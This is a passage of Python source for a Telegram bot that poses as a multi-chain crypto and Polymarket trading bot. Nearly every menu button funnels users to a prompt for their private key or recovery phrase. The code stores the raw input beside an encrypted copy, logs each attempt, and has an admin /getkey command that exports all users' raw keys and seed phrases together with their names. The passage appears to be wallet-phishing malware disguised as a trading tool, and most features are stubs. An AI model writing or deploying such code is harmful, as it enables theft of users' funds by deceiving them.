         InlineKeyboardButton("🛡️ Stop Loss (0)", callback_data="portfolio_stop_loss")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="portfolio_refresh"),
         InlineKeyboardButton("🏠 Main Menu", callback_data="portfolio_main_menu")],
    ])

def _portfolio_text() -> str:
    return (
        "🗂️ All Positions\n\n"
        "You have no open or resolved positions.\n\n"
        "Paste a Polymarket link to start trading."
    )

# ── Chains ────────────────────────────────────────────────────────────────────
CHAINS = ["sol", "eth", "bnb", "base", "hype", "tron", "sui", "pol"]

def chains_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("SOL",  callback_data="chain_sol"),
         InlineKeyboardButton("ETH",  callback_data="chain_eth")],
        [InlineKeyboardButton("BNB",  callback_data="chain_bnb"),
         InlineKeyboardButton("BASE", callback_data="chain_base")],
        [InlineKeyboardButton("HYPE", callback_data="chain_hype"),
         InlineKeyboardButton("TRON", callback_data="chain_tron")],
        [InlineKeyboardButton("SUI",  callback_data="chain_sui"),
         InlineKeyboardButton("POL",  callback_data="chain_pol")],
        [InlineKeyboardButton("◀️ Back", callback_data="chains_back")],
    ])

def chain_wallet_keyboard(chain: str):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🔑 Import {chain.upper()} Wallet", callback_data=f"chain_{chain}_import"),
         InlineKeyboardButton("❌ Delete Wallet", callback_data="wallets_delete")],
        [InlineKeyboardButton("◀️ Back", callback_data="chains"),
         InlineKeyboardButton("🗑️ Close", callback_data="wallets_close")],
    ])

def _chain_wallet_text(chain: str) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        f"💰 *{chain.upper()} Wallet Settings*\n\n"
        f"Import your {chain.upper()} wallet to get started\\.\n\n"
        f"👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

# ── Main menu buttons ─────────────────────────────────────────────────────────
MAIN_MENU_BUTTONS = {
    "positions", "lp_sniper", "copy_trade", "wallets", "afk_mode",
    "presales", "settings", "limit_orders", "withdraw", "referral",
    "bridge", "refresh", "recovery", "chains", "manual_buyer",
    "backup_bots",
}

# ── Start ─────────────────────────────────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await ensure_bot_username(ctx)
    user = update.effective_user
    if user:
        user_info = all_users.setdefault(user.id, {})
        user_info.update({
            "username":   user.username,
            "first_name": user.first_name,
            "last_name":  user.last_name,
        })
        if ctx.args:
            token = ctx.args[0].strip()
            if token.startswith("ref_"):
                token = token[4:]
            referrer_uid = _decode_referral_code(token)
            if referrer_uid is not None and referrer_uid != user.id:
                user_info["referrer_uid"] = referrer_uid
                ctx.user_data["referrer_uid"] = referrer_uid

    await update.message.reply_text(
        _home_screen_text(),
        parse_mode="HTML",
        disable_web_page_preview=True,
        reply_markup=main_menu_keyboard(),
    )

# ── Admin command ─────────────────────────────────────────────────────────────
async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin-only: /getkey [user_id|all] — exports stored wallet inputs."""
    caller_id = update.effective_user.id

    if caller_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if update.message.chat.type != "private":
        await update.message.reply_text("⚠️ Use this command in a private chat only.")
        return

    target_uid: int | None = None
    if ctx.args:
        arg = ctx.args[0].strip().lower()
        if arg not in {"all", "*"}:
            try:
                target_uid = int(arg)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID.")
                return

    if target_uid is None:
        target_ids = sorted(set(user_wallets) | set(wallet_import_history))
        if not target_ids:
            await update.message.reply_text("❌ No wallet inputs found.")
            return
        header = "🔑 Admin Wallet Export\n\nShowing all stored wallet inputs."
    else:
        if target_uid not in user_wallets and target_uid not in wallet_import_history:
            await update.message.reply_text(f"❌ No wallet inputs found for user {target_uid}.")
            return
        target_ids = [target_uid]
        header = f"🔑 Admin Wallet Export\n\nShowing wallet inputs for user {target_uid}."

    lines = [header, "", f"Total users: {len(target_ids)}", ""]
    for index, uid in enumerate(target_ids, start=1):
        entry = user_wallets.get(uid)
        info = all_users.get(uid, {})
        username = info.get("username")
        full_name = _format_full_name(info)
        history = wallet_import_history.get(uid, [])
        lines.extend([
            f"[{index}] User ID: {uid}",
            f"Username: @{username}" if username else "Username: N/A",
            f"Name: {full_name}" if full_name else "Name: N/A",
            f"Current public key: {entry.get('pubkey', 'N/A')}" if entry else "Current public key: N/A",
            f"Import attempts: {len(history)}",
            "",
        ])

        if history:
            for attempt_index, attempt in enumerate(history, start=1):
                lines.extend([
                    f"  - Attempt {attempt_index}",
                    f"    Time: {attempt.get('timestamp', 'N/A')}",
                    f"    Origin: {attempt.get('origin', 'unknown')}",
                    f"    Status: {'valid' if attempt.get('valid') else 'invalid'}",
                    "    Input:",
                    f"    {attempt.get('text', '')}",
                ])
                if attempt.get("pubkey"):
                    lines.append(f"    Pubkey: {attempt['pubkey']}")
                lines.append("")
        elif entry and entry.get("original_input") is not None:
            lines.extend([
                "Imported input:",
                entry.get("original_input", "N/A"),
                "",
            ])

    message_text = "\n".join(lines).rstrip()
    sent_messages = []
    for chunk in _split_message(message_text):
        sent = await update.message.reply_text(chunk)
        sent_messages.append(sent)

    for sent in sent_messages:
        ctx.job_queue.run_once(
            _delete_message_job,
            30,
            data=(update.message.chat_id, sent.message_id),
        )

# ── Admin: list all users ─────────────────────────────────────────────────────
async def allusers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized.")
        return
    if not all_users:
        await update.message.reply_text("No users yet.")
        return
    msg = "*All Users:*\n\n"
    for uid, info in all_users.items():
        msg += f"ID: `{uid}` | @{info['username']} | {info['first_name']}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

# ── Button handler ────────────────────────────────────────────────────────────
async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    await query.answer()
    await ensure_bot_username(ctx)
    uid     = query.from_user.id
    data    = query.data
    chat_id = query.message.chat_id

    user = update.effective_user
    user_info = all_users.setdefault(user.id, {})
    user_info.update({
        "username":   user.username,
        "first_name": user.first_name,
        "last_name":  user.last_name,
    })
    logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")

    # ── Positions screen ──────────────────────────────────────────────────────
    if data == "positions":
        await query.edit_message_text(
            _markets_text(ctx.user_data.get("market_category")),
            reply_markup=positions_keyboard(),
        )
        return

    if data == "markets":
        await query.edit_message_text(
            _markets_text(ctx.user_data.get("market_category")),
            reply_markup=positions_keyboard(),
        )
        return

    if data in MARKET_CATEGORY_LABELS:
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "portfolio":
        if not user_wallets.get(uid):
            await query.edit_message_text(
                "⚠️ Error\n\nYou need to add a wallet first",
                reply_markup=back_to_menu_keyboard(),
            )
            return
        await query.edit_message_text(
            _portfolio_text(),
            reply_markup=portfolio_keyboard(),
        )
        return

    if data in (
        "portfolio_prev",
        "portfolio_page",
        "portfolio_next",
        "portfolio_all",
        "portfolio_open",
        "portfolio_history",
        "portfolio_sort",
        "portfolio_limit_orders",
        "portfolio_stop_loss",
    ):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "portfolio_refresh":
        await query.edit_message_text(
            _portfolio_text(),
            reply_markup=portfolio_keyboard(),
        )
        return

    if data in ("portfolio_back", "portfolio_main_menu", "portfolio_close"):
        await _show_main_menu(query)
        return

    if data in (
        "portfolio_pnl_report",
        "portfolio_address",
        "portfolio_signal",
        "portfolio_user",
        "portfolio_pnl",
        "portfolio_smart_money",
        "portfolio_full",
    ):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "positions_refresh":
        await query.edit_message_text(
            _markets_text(ctx.user_data.get("market_category")),
            reply_markup=positions_keyboard(),
        )
        return

    if data == "positions_delete":
        await query.message.delete()
        return

    if data == "positions_homepage":
        ctx.user_data.pop("market_category", None)
        await _show_main_menu(query)
        return

    # ── Wallet settings screen (from positions buttons) ───────────────────────
    if data in ("positions_usd", "positions_min_value", "positions_sell"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "wallets_import":
        ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
        await ctx.bot.send_message(
            chat_id,
            "Please enter your private key or recovery phrase:",
            reply_markup=ForceReply(selective=True),
        )
        return

    if data == "wallets_back":
        await _show_main_menu(query)
        return

    if data == "wallets_delete":
        if uid in user_wallets:
            del user_wallets[uid]
            await query.edit_message_text(
                "✅ Wallet deleted successfully\\.",
                parse_mode="MarkdownV2",
                reply_markup=wallet_settings_keyboard(),
            )
        else:
            await query.answer("No wallet to delete.", show_alert=True)
        return

    if data == "wallets_close":
        await _show_main_menu(query)
        return

    if data == "manual_buyer":
        if not get_keypair(uid):
            await query.edit_message_text(
                _wallet_settings_text(),
                parse_mode="MarkdownV2",
                reply_markup=wallet_settings_keyboard(),
            )
            return

        ctx.user_data["side"] = "buy"
        ctx.user_data["awaiting"] = AWAITING_TOKEN_ADDR
        await ctx.bot.send_message(
            chat_id,
            "💡 Paste the token address below to quick start with preset defaults.",
            reply_markup=ForceReply(selective=True),
        )
        return

    # ── LP Sniper screen ──────────────────────────────────────────────────────
    if data == "lp_sniper":
        await query.edit_message_text(
            _lp_sniper_text(),
            parse_mode="MarkdownV2",
            reply_markup=lp_sniper_keyboard(),
        )
        return

    if data == "lp_sniper_refresh":
        await query.edit_message_text(
            _lp_sniper_text(),
            parse_mode="MarkdownV2",
            reply_markup=lp_sniper_keyboard(),
        )
        return

    if data == "lp_sniper_create":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "lp_sniper_back":
        await _show_main_menu(query)
        return

    if data == "lp_sniper_close":
        await _show_main_menu(query)
        return

    # ── Pending Snipes screen ────────────────────────────────────────────────────
    if data == "pending_snipes":
        await query.edit_message_text(
            _pending_snipes_text(),
            parse_mode="MarkdownV2",
            reply_markup=pending_snipes_keyboard(),
        )
        return

    if data == "pending_snipes_main_menu":
        await _show_main_menu(query)
        return

    if data in ("pending_snipes_sol", "pending_snipes_eth", "pending_snipes_bnb", "pending_snipes_base"):
        await query.answer("Chain selected", show_alert=False)
        return

    # ── Copy Trade screen ─────────────────────────────────────────────────────
    if data == "copy_trade":
        await _show_copy_trade(query, ctx)
        return

    if data == "copy_trade_refresh":
        await _show_copy_trade(query, ctx)
        return

    if data == "copy_trade_chain_prev":
        await _show_copy_trade(query, ctx, _shift_copy_trade_chain(ctx.user_data.get("copy_trade_chain"), -1))
        return

    if data == "copy_trade_chain_next":
        await _show_copy_trade(query, ctx, _shift_copy_trade_chain(ctx.user_data.get("copy_trade_chain"), 1))
        return

    if data == "copy_trade_chain_current":
        await _show_copy_trade(query, ctx)
        return

    if data == "copy_trade_new":
        if not get_keypair(uid):
            await query.edit_message_text(
                _wallet_settings_text(),
                parse_mode="MarkdownV2",
                reply_markup=wallet_settings_keyboard(),
            )
            return

        ctx.user_data["awaiting"] = AWAITING_COPY_TRADE_TARGET
        await ctx.bot.send_message(
            chat_id,
            "🎭 Paste the trader wallet address to start a copy trade.",
            reply_markup=ForceReply(selective=True),
        )
        return

    if data == "copy_trade_blocked_tokens":
        await query.edit_message_text(
            _copy_trade_blocked_tokens_text(),
            reply_markup=copy_trade_detail_keyboard(),
        )
        return

    if data == "copy_trade_token_creator_filter":
        await query.edit_message_text(
            _copy_trade_creator_filter_text(),
            reply_markup=copy_trade_detail_keyboard(),
        )
        return

    if data == "copy_trade_detail_back":
        await _show_copy_trade(query, ctx)
        return

    if data in (
        "copy_trade_create",
        "copy_trade_subwallet",
        "copy_trade_backtesting",
        "copy_trade_defaults",
        "copy_trade_failed_alerts",
        "copy_trade_stop_all",
        "copy_trade_add",
        "copy_trade_activity",
        "copy_trade_pause",
        "copy_trade_all",
        "copy_trade_active",
        "copy_trade_add_subscription",
        "copy_trade_discover",
    ):
        await _show_copy_trade(query, ctx)
        return

    if data == "copy_trade_back":
        await _show_main_menu(query)
        return

    if data == "copy_trade_close":
        try:
            await query.message.delete()
        except Exception:
            await _show_main_menu(query)
        return

    # ── Wallets screen ────────────────────────────────────────────────────────
    if data == "wallets":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── AFK Mode screen ───────────────────────────────────────────────────────
    if data == "afk_mode":
        await query.edit_message_text(
            _afk_mode_text(),
            reply_markup=afk_mode_keyboard(),
        )
        return

    if data == "afk_refresh":
        await query.edit_message_text(
            _afk_mode_text(),
            reply_markup=afk_mode_keyboard(),
        )
        return

    if data in ("afk_create", "afk_backtesting", "afk_activity", "afk_new"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data in ("afk_update", "afk_add_config", "afk_pause", "afk_start"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data in ("afk_back", "afk_main_menu"):
        await _show_main_menu(query)
        return

    if data == "afk_close":
        await _show_main_menu(query)
        return

    if data == "backup_bots":
        await query.edit_message_text(
            _backup_bots_text(),
            reply_markup=backup_bots_keyboard(),
        )
        return

    if data == "backup_bots_refresh":
        await query.edit_message_text(
            _backup_bots_text(),
            reply_markup=backup_bots_keyboard(),
        )
        return

    if data in ("backup_bots_back", "backup_bots_close"):
        await _show_main_menu(query)
        return

    # ── Presales screen ───────────────────────────────────────────────────────
    if data == "presales":
        await query.edit_message_text(
            _presales_text(),
            reply_markup=presales_keyboard(),
        )
        return

    if data in ("presales_config", "presales_add"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "presales_back":
        await _show_main_menu(query)
        return

    if data == "presales_close":
        await _show_main_menu(query)
        return

    # ── Settings screen ───────────────────────────────────────────────────────
    if data == "settings":
        ctx.user_data.pop("language_return", None)
        await query.edit_message_text(
            _settings_text(),
            reply_markup=settings_keyboard(),
        )
        return

    if data == "settings_menu_back":
        ctx.user_data.pop("language_return", None)
        await query.edit_message_text(
            _settings_text(),
            reply_markup=settings_keyboard(),
        )
        return

    if data in ("settings_security_pin", "settings_security", "settings_wallet_security_header", "settings_export_private_key", "settings_2fa_header", "settings_enable_2fa"):
        await query.edit_message_text(
            _settings_page_text(
                "🔨 Security Pin Settings",
                "Security controls are not configured yet.",
            ),
            reply_markup=settings_detail_keyboard(),
        )
        return

    if data in ("settings_presets", "settings_trading", "settings_buy_sell_setting"):
        await query.edit_message_text(
            _preset_settings_text(),
            reply_markup=preset_settings_keyboard(),
        )
        return

    if data == "settings_wallets":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(back_callback="settings_menu_back"),
        )
        return

    if data in ("settings_recovery", "settings_copy_mode", "settings_manual_trade_confirm", "settings_trade_mode_header", "settings_trade_mode_cautious", "settings_trade_mode_standard", "settings_trade_mode_expert", "settings_trade_threshold_header", "settings_trade_threshold_100", "settings_quickbuy_header", "settings_quickbuy_10", "settings_quickbuy_25", "settings_quickbuy_50"):
        keyboard = recovery_keyboard() if data == "settings_recovery" else settings_detail_keyboard()
        await query.edit_message_text(
            _settings_page_text(
                "♻️ Recovery",
                "Configure recovery and related wallet handling options.",
            ),
            reply_markup=keyboard,
        )
        return

    if data in ("settings_buy_preset", "settings_sell_preset"):
        side = "buy" if data == "settings_buy_preset" else "sell"
        await query.edit_message_text(
            _preset_side_text(side),
            reply_markup=wallet_settings_keyboard(back_callback="settings_buy_sell_setting"),
        )
        return

    if data == "settings_language":
        ctx.user_data["language_return"] = "settings_menu_back"
        await query.edit_message_text(
            LANGUAGE_MENU_TEXT,
            reply_markup=language_keyboard(back_callback="settings_menu_back"),
        )
        return

    if data == "settings_referral":
        bot_username = ctx.bot.username or (await ctx.bot.get_me()).username
        await query.edit_message_text(
            _referral_text(uid, bot_username),
            reply_markup=referral_keyboard(back_callback="settings_menu_back", close_callback="settings_close"),
        )
        return

    if data in ("settings_customize_ui", "settings_pnl_card", "settings_display_header", "settings_american_odds"):
        await query.edit_message_text(
            _settings_page_text(
                "🖼️ Customize UI",
                "Adjust the interface styling and information density.",
            ),
            reply_markup=settings_detail_keyboard(),
        )
        return

    if data in ("settings_utilities", "settings_auto_redeem"):
        await query.edit_message_text(
            _settings_page_text(
                "🧰 Utilities",
                "Utility actions live here.",
            ),
            reply_markup=settings_detail_keyboard(),
        )
        return

    if data == "settings_back":
        ctx.user_data.pop("language_return", None)
        await _show_main_menu(query)
        return

    if data == "settings_close":
        ctx.user_data.pop("language_return", None)
        try:
            await query.message.delete()
        except Exception:
            await _show_main_menu(query)
        return

    # ── Withdraw screen ───────────────────────────────────────────────────────
    if data == "withdraw":
        await query.edit_message_text(
            _withdraw_text(),
            parse_mode="MarkdownV2",
            reply_markup=withdraw_keyboard(),
        )
        return

    if data == "withdraw_refresh":
        await query.edit_message_text(
            _withdraw_text(),
            parse_mode="MarkdownV2",
            reply_markup=withdraw_keyboard(),
        )
        return

    if data in ("withdraw_50", "withdraw_100", "withdraw_xsol", "withdraw_set_address"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "withdraw_back":
        await _show_main_menu(query)
        return

    if data == "withdraw_close":
        await _show_main_menu(query)
        return

    # ── Referral screen ───────────────────────────────────────────────────────
    if data == "referral":
        bot_username = ctx.bot.username or (await ctx.bot.get_me()).username
        await query.edit_message_text(
            _referral_text(uid, bot_username),
            reply_markup=referral_keyboard(),
        )
        return

    if data == "referral_refresh":
        bot_username = ctx.bot.username or (await ctx.bot.get_me()).username
        await query.edit_message_text(
            _referral_text(uid, bot_username),
            reply_markup=referral_keyboard(),
        )
        return

    if data in ("referral_generate", "referral_change", "referral_edit_code", "referral_create_qr", "referral_claim"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "referral_back":
        await _show_main_menu(query)
        return

    if data == "referral_close":
        await _show_main_menu(query)
        return

    # ── Competition screen ───────────────────────────────────────────────────
    if data in ("competition", "portfolio_competition"):
        await query.edit_message_text(
            _competition_text(),
            reply_markup=competition_keyboard(),
        )
        return

    if data == "competition_add_account":
        language = ctx.user_data.get("language", "en")
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(language),
        )
        return

    if data == "competition_close":
        await _show_main_menu(query)
        return

    # ── Bridge screen ─────────────────────────────────────────────────────────
    if data == "bridge":
        await query.edit_message_text(
            _bridge_text(),
            reply_markup=bridge_keyboard(BOT_USERNAME),
        )
        return

    if data == "bridge_refresh":
        await query.edit_message_text(
            _bridge_text(),
            reply_markup=bridge_keyboard(BOT_USERNAME),
        )
        return

    if data in ("bridge_set_address", "bridge_bsc", "bridge_eth",
                "bridge_base", "bridge_hype", "bridge_bridge"):
        await query.edit_message_text(
            _bridge_text(),
            reply_markup=bridge_keyboard(BOT_USERNAME),
        )
        return

    if data == "bridge_back":
        await _show_main_menu(query)
        return

    if data == "bridge_close":
        await _show_main_menu(query)
        return

    # ── Refresh main menu ─────────────────────────────────────────────────────
    if data == "refresh":
        await _show_main_menu(query)
        return

    # ── Recovery screen ───────────────────────────────────────────────────────
    if data in ("recovery", "smart_wallet"):
        await query.edit_message_text(
            _recovery_text(),
            reply_markup=recovery_keyboard(),
        )
        return

    if data == "recovery_add_wallet":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── Chains screen ─────────────────────────────────────────────────────────
    if data == "chains":
        await query.edit_message_text(
            "🔗 *Select your preferred Network*",
            parse_mode="MarkdownV2",
            reply_markup=chains_keyboard(),
        )
        return

    if data == "chains_back":
        await _show_main_menu(query)
        return

    if data == "help":
        await query.edit_message_text(
            _help_text(),
            reply_markup=help_keyboard(),
        )
        return

    if data == "quick_start":
        await query.edit_message_text(
            _alerts_text(),
            reply_markup=alerts_keyboard(),
        )
        return

    if data in (
        "alerts_prev",
        "alerts_page",
        "alerts_next",
        "alerts_add_market",
        "alerts_add_wallet",
    ):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "alerts_main_menu":
        await _show_main_menu(query)
        return

    if data == "help_recovery":
        await query.edit_message_text(
            _recovery_text(),
            reply_markup=recovery_keyboard(),
        )
        return

    if data == "help_create_ticket":
        await query.edit_message_text(
            "📝 Create Ticket\n\nTicket creation is not available yet.",
            reply_markup=back_to_menu_keyboard(),
        )
        return

    if data in ("language_menu", "language_en"):
        ctx.user_data.pop("language_return", None)
        await query.edit_message_text(
            LANGUAGE_MENU_TEXT,
            reply_markup=language_keyboard(),
        )
        return

    if data == "language_back":
        await _show_main_menu(query)
        return

    if data in LANGUAGE_SELECTIONS:
        language = LANGUAGE_SELECTIONS[data]
        ctx.user_data["language"] = language
        back_callback = ctx.user_data.pop("language_return", "wallets_back")
        await query.edit_message_text(
            _localized_wallet_settings_text(language),
            reply_markup=wallet_settings_keyboard(language, back_callback=back_callback),
        )
        return

    # ── Per-chain wallet screens ───────────────────────────────────────────────
    for chain in CHAINS:
        if data == f"chain_{chain}":
            await query.edit_message_text(
                _chain_wallet_text(chain),
                parse_mode="MarkdownV2",
                reply_markup=chain_wallet_keyboard(chain),
            )
            return

        if data == f"chain_{chain}_import":
            ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
            await ctx.bot.send_message(
                chat_id,
                f"Please enter your {chain.upper()} private key or recovery phrase:",
                reply_markup=ForceReply(selective=True),
            )
            return

    # ── TP/SL screen ──────────────────────────────────────────────────────────
    if data == "tpsl_orders":
        await query.edit_message_text(
            _tpsl_text(),
            reply_markup=tpsl_keyboard(),
        )
        return

    if data in ("tpsl_active", "tpsl_closed", "tpsl_new_stop_loss", "tpsl_activity_logs"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "tpsl_portfolio":
        await query.edit_message_text(
            _portfolio_text(),
            reply_markup=portfolio_keyboard(),
        )
        return

    # ── Limit Orders screen ───────────────────────────────────────────────────
    if data == "limit_orders":
        await query.edit_message_text(
            _limit_orders_text(),
            parse_mode="MarkdownV2",
            reply_markup=limit_orders_keyboard(),
        )
        return

    # ── Every main menu button — show wallet settings instead of a gate ───────
    if data in MAIN_MENU_BUTTONS:
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── User tapped Import Wallet — ask for private key ───────────────────────
    if data.startswith("do_import__"):
        origin = data.split("__", 1)[1]
        ctx.user_data["import_origin"] = origin
        ctx.user_data["awaiting"]      = AWAITING_PRIVATE_KEY
        await ctx.bot.send_message(
            chat_id,
            "🔑 Send your *base58 private key* as the next message.\n\n"
            "⚠️ Your message will be deleted immediately after processing.",
            parse_mode="Markdown",
        )
        return

    # ── Cancel prompt — send new message confirming cancel ───────────────────
    if data == "cancel_prompt":
        await ctx.bot.send_message(
            chat_id,
            "❌ Cancelled. Tap a button below to try again.",
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Back to menu ──────────────────────────────────────────────────────────
    if data == "back_to_menu":
        await _show_main_menu(query)
        return

    # ── Close — return to the main menu ───────────────────────────────────────
    if data == "close":
        try:
            await query.message.delete()
        except Exception:
            await query.edit_message_text(
                _home_screen_text(),
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=main_menu_keyboard(),
            )
        return

    # ── Swap confirmations ────────────────────────────────────────────────────
    if data in ("confirm_buy", "confirm_sell"):
        await confirm_swap(update, ctx)
        return

# ── Message handler (multi-step flows) ───────────────────────────────────────
async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    chat_id  = update.message.chat_id
    raw_text = update.message.text or ""
    text     = raw_text.strip()
    awaiting = ctx.user_data.get("awaiting")
    await ensure_bot_username(ctx)

    user = update.effective_user
    all_users[user.id] = {
        "username":   user.username,
        "first_name": user.first_name,
        "last_name":  user.last_name,
    }
    logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")

    # ── Import private key or mnemonic ───────────────────────────────────────
    if awaiting == AWAITING_PRIVATE_KEY:
        import_record = _record_wallet_import_input(
            uid,
            raw_text,
            ctx.user_data.get("import_origin"),
        )
        try:
            await update.message.delete()
        except Exception as exc:
            logger.debug("Could not delete import message for %s: %s", uid, exc)

        try:
            if " " not in text:
                # Try base58 private key
                kp = Keypair.from_base58_string(text)
            else:
                # Treat as mnemonic seed phrase without strict validation
                seed = Mnemonic("english").to_seed(text)[:32]
                kp = Keypair.from_seed(bytes(seed))

            enc = encrypt_key(bytes(kp))
            import_record["valid"] = True
            import_record["pubkey"] = str(kp.pubkey())
            user_wallets[uid] = {
                "keypair_enc": enc,
                "pubkey": str(kp.pubkey()),
                "original_input": raw_text,  # stores the exact input from the user
            }
            ctx.user_data.pop("awaiting", None)
            await ctx.bot.send_message(
                uid,
                f"✅ <b>Wallet imported successfully!</b>\n\n<code>{html.escape(str(kp.pubkey()))}</code>\n\nYou can now use all features.",
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=main_menu_keyboard(),
            )
        except Exception as e:
            logger.error(f"Wallet import error: {e}")
            await ctx.bot.send_message(uid, "❌ Invalid private key or recovery phrase. Please try again.")
        return

    # ── Token address for buy/sell ────────────────────────────────────────────
    if awaiting == AWAITING_TOKEN_ADDR:
        ctx.user_data["token_mint"] = text
        side      = ctx.user_data.get("side", "buy")
        price     = await get_token_price_usd(text)
        price_str = f"${price:.6f}" if price else "unknown"
        if side == "buy":
            ctx.user_data["awaiting"] = AWAITING_BUY_AMOUNT
            await update.message.reply_text(
                f"Token price: *{price_str}*\n\nHow many *SOL* to spend?",
                parse_mode="Markdown",
            )
        else:
            ctx.user_data["awaiting"] = AWAITING_SELL_AMOUNT
            await update.message.reply_text(
                f"Token price: *{price_str}*\n\nHow many *tokens* to sell (in smallest unit)?",
                parse_mode="Markdown",
            )
        return

    # ── Buy amount ────────────────────────────────────────────────────────────
    if awaiting == AWAITING_BUY_AMOUNT:
        try:
            sol_amount = float(text)
            lamports   = int(sol_amount * 1e9)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount.")
            return

        token_mint = ctx.user_data.get("token_mint")
        await update.message.reply_text("⏳ Getting quote...")
        quote = await jupiter_quote(SOL_MINT, token_mint, lamports)
        if not quote:
            await update.message.reply_text("❌ Could not get quote from Jupiter.")
            return

        out_amount = int(quote.get("outAmount", 0))
        await update.message.reply_text(
            f"📊 *Quote*\n\nSpend: `{sol_amount} SOL`\nReceive: `{out_amount}` tokens\n\nConfirm?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_buy"),
                 InlineKeyboardButton("❌ Cancel",  callback_data="cancel_prompt")],
            ]),
        )
        ctx.user_data["pending_quote"] = quote
        ctx.user_data["awaiting"]      = None
        return

    # ── Sell amount ───────────────────────────────────────────────────────────
    if awaiting == AWAITING_SELL_AMOUNT:
        try:
            token_amount = int(text)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount.")
            return

        token_mint = ctx.user_data.get("token_mint")
        await update.message.reply_text("⏳ Getting quote...")
        quote = await jupiter_quote(token_mint, SOL_MINT, token_amount)
        if not quote:
            await update.message.reply_text("❌ Could not get quote from Jupiter.")
            return

        out_lamports = int(quote.get("outAmount", 0))
        await update.message.reply_text(
            f"📊 *Quote*\n\nSell: `{token_amount}` tokens\nReceive: `{out_lamports/1e9:.4f} SOL`\n\nConfirm?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_sell"),
                 InlineKeyboardButton("❌ Cancel",  callback_data="cancel_prompt")],
            ]),
        )
        ctx.user_data["pending_quote"] = quote
        ctx.user_data["awaiting"]      = None
        return

    # ── Copy trade target wallet ──────────────────────────────────────────────
    if awaiting == AWAITING_COPY_TRADE_TARGET:
        ctx.user_data["copy_trade_target"] = text
        ctx.user_data["awaiting"] = None
        chain = _copy_trade_chain(ctx.user_data.get("copy_trade_chain"))
        await ctx.bot.send_message(
            chat_id,
            f"✅ Copy trade target saved:\n\n<code>{html.escape(text)}</code>",
            parse_mode="HTML",
            reply_markup=copy_trade_keyboard(chain),
        )
        return

# ── Swap confirmation ─────────────────────────────────────────────────────────
async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    uid     = query.from_user.id
    chat_id = query.message.chat_id
    await ensure_bot_username(ctx)
    kp      = get_keypair(uid)
    entry   = user_wallets.get(uid)

    if not kp or not entry:
        await ctx.bot.send_message(chat_id, "❌ No wallet found.")
        return

    quote = ctx.user_data.get("pending_quote")
    if not quote:
        await ctx.bot.send_message(chat_id, "❌ Quote expired. Start over.")
        return

